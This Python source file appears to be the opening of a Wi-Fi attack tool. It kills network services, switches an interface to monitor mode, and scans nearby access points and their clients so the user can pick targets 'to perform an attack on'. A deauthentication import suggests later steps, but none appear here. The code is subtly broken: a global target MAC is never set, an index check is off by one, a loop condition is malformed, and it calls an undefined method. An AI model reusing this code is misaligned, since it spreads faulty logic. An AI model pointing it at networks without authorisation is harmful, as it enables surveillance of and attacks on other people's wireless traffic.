import os
import sys
from colorama import Fore
import time
from datetime import datetime
from run import bash, print_errors, print_header, print_regular, print_sub_header
import run
from string import Template
from scapy.all import *
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth

AP_list = []
CLIENT_list = []
AP_MAC = ""

def search(word: str, text: str):
    result = text.find(word)
    return result != -1


def set_monitor_mode(interface):
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw {interface} set monitor control")
    os.system(f"sudo ip link set {interface} up")

def finding(pkt):
    if pkt.haslayer(Dot11Beacon):
        mac_address = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_address not in [x[1] for x in AP_list[0:]]:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            AP_list.append([ap_name, mac_address, channel])
            print_regular(f"Found new Access Point: SSID='{ap_name}', MAC='{mac_address}', "
                          f"Channel='{channel}'")

def finding_inside_ap(pkt):
    """
    It first checks if the packet's addr2 or addr3 is equal to the ap_mac,
    which would mean that the packet is either coming from or going to the access point. 
    If the packet's addr1 is not a broadcast address and it is not already in the client_list, 
    the function appends the addr1 to the client_list.
    
    """
    if (pkt.addr2 == AP_MAC or pkt.addr3 == AP_MAC) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in CLIENT_list and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
            CLIENT_list.append(pkt.addr1)
            print_regular('Found new Client : MAC = {}'.format(pkt.addr1))

class Attack:

    def __init__(self):

        print_regular("initint attack process")

        # lets prepare the ground
        # kill processes that may interfere with monitor mode on Wi-Fi interfaces.
        bash('service NetworkManager stop')
        bash('airmon-ng check kill')

        iwconfig_output = os.popen('iwconfig').read()
        print(iwconfig_output)

        self.sniffer_w = 'none'
        result = True
        while result:
            sniffer_w = input("Enter sniffer interface name: ")
            if sniffer_w in iwconfig_output:
                self.sniffer_w = sniffer_w
                result = False
            else:
                print("You entered an invalid name. Please try again.")
            

        self.ap = 'none'
        result = True
        while result:
            ap = input("Enter AP interface name: ")
            if ap in iwconfig_output:
                self.ap = ap
                result = False
            else:
                print("You entered an invalid name. Please try again.")
        print("Nice. Sniffer interface: {}, AP interface: {}".format(self.sniffer_w, self.ap))
        print_regular('changing {} to monitor mode'.format(self.sniffer_w))
        set_monitor_mode(self.sniffer_w)
        

    
    def network_search(self):
        '''
            We took inspiration from: https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
        '''
        channel_thread = Thread(target=run.channel_changing, args=(self.sniffer_w, 10), daemon=True)
        channel_thread.start()
        print_regular('Starting to Scan networks...')
        try:
            """
                prn=finding: This specifies a callback function that will be called for each packet
                captured by the sniffer. The finding_networks function will be executed on each packet, 
                allowing it to perform specific actions, such as analyzing the packet
            """
            sniff(prn=finding, iface=self.sniffer_w, timeout=15)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.network_search.__name__), e)
        channel_thread.join()

        
        print_sub_header('Networks Available:')

        if len(AP_list) == 0:
            choice = input('No Networks were found, for rescan type \'Rescan\', to quit type \'quit\'\n')
            if choice == 'Rescan':
                return self.network_search()
            elif choice == 'quit':
                print_regular('Perform cleanup')
                os.system('sudo sh Templates/cleanup.sh')
                sys.exit('{} Perform exit() with exit code {} , {}'.format(Fore.WHITE, 0, "BY"))
        else:
            counter = 1
            for sublist in AP_list:
                print_regular('[{}] AP Name = {}  MAC Address = {} channel = {} '.format(counter, sublist[0], sublist[1], sublist[2]))
                counter += 1
            while True:
                index = input('Please choose the network you want to perform an attack on, or type \'Rescan\' to scan for new networks:\n')
                if index.isdigit() and int(index) in range(len(AP_list)): 
                    return AP_list[int(index)-1]
                else:
                    print_errors('Not a valid option. Please select one of the networks mentioned above.')

    def client_search(self, AP):
        channel_thread = Thread(target=run.channel_changing, args=(self.sniffer_w, 30), daemon=True)
        channel_thread.start()
        print_regular('Scanning clients on this Access Point')
        AP_MAC = AP[1]
        try:
            sniff(prn=finding_inside_ap, iface=self.sniffer_w, timeout=30)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.client_search.__name__), e)
        channel_thread.join()

        print_sub_header('Clients Available:')

        counter = 1
        if len(CLIENT_list) > 0:
            
            for sublist in CLIENT_list:
                print_regular('[{}] MAC Address = {}'.format(counter, sublist))
                counter+=1
            while counter in range(len(CLIENT_list) + 1) == False:
                counter = input('Please Choose the client you want to perform an attack on , if you want to explore '
                              'more clients Please type \'Rescan\' for a new clients scan\n')
            return CLIENT_list[counter - 1]
        else:
            choice = input('No Clients were found , for rescan type \'Rescan\' , to quit type \'quit\' \n')
            if choice == 'Rescan':
                return self.get_client_index(AP)
            #elif choice == 'quit':
                #run.exit_and_cleanup(0, 'GoodBye')

    
